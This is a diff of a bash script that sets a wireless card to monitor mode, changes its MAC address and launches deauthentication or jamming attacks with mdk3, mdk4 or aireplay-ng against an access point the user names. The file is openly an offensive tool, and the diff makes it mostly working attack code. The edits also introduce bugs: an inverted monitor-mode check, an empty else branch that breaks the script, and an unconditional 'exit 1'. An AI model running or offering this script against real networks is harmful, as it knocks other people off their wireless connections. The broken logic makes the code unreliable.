@@ -82,16 +82,23 @@ echo "The AP's name is: $AP"
 #setting up the wireless adapter and other stuff that might interfere with the attack
 echo "setting up the wireless adapter/interfaces"
 sudo ifconfig eth0 down 
-sudo iwconfig wlan0 down 
-sudo macchanger -r wlan0 
+sudo ifconfig wlan0 down 
+sudo macchanger wlan0 
 sudo systemctl stop wpa_supplicant
 sudo systemctl stop NetworkManager
-sudo airmon wlan0 start
-sudo iwconfig wlan0 mode monitor
+sudo airmon-ng start wlan0
+monitorcheck=$(sudo iwconfig wlan0 mode monitor &> /dev/null && echo "true" || echo "false")
+if [ $monitorcheck == "false" ]; then
+    echo "monitor mode is enabled"
+else
+    echo "monitor mode is not enabled"
+    echo "changing to monitor mode"
+    sudo iwconfig wlan0 mode monitor
+fi
 sudo ifconfig wlan0 up
 
 #asking the user which attack they want to use
-read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?": " attack"
+read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?: " "attack"
 if [ $attack == "1" ]; then
     echo "starting mdk3 attack"
     sudo mdk3 wlan0 d -w $AP
@@ -124,8 +131,9 @@ elif [ $attack == "3" ]; then
     fi
     echo "all files deleted or non existent"
     sleep 1
-    echo "starting airodump-ng to find $AP, this will take 15 seconds"
-    sudo timeout 15 airodump-ng -b abg -N $AP wlan0 --write wlan0 --output-format csv  
+    echo "starting airodump-ng to find $AP, this will take 30 seconds"
+    sudo timeout 30 airodump-ng -b abg -N "$AP" wlan0 --write wlan0 --output-format csv
+    sleep 32
     cat wlan0-01.csv | grep $AP > bssid.csv
     cat bssid.csv | sed 's/,//g' > bssid1.csv
     checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
@@ -158,10 +166,11 @@ elif [ $attack == "3" ]; then
             sudo aireplay-ng -0 $time -a $usedbssid wlan0
             echo "attack finished"
             sleep 1 
-            echo "exiting"
-            exit 1
         fi
+    else
+        echo "only one bssid found"
+        thebssid=$(cat bssid1.csv | awk '{print $1}')
+    fi
 else
-    echo "invalid input"
-    exit 1
 fi
+exit 1 
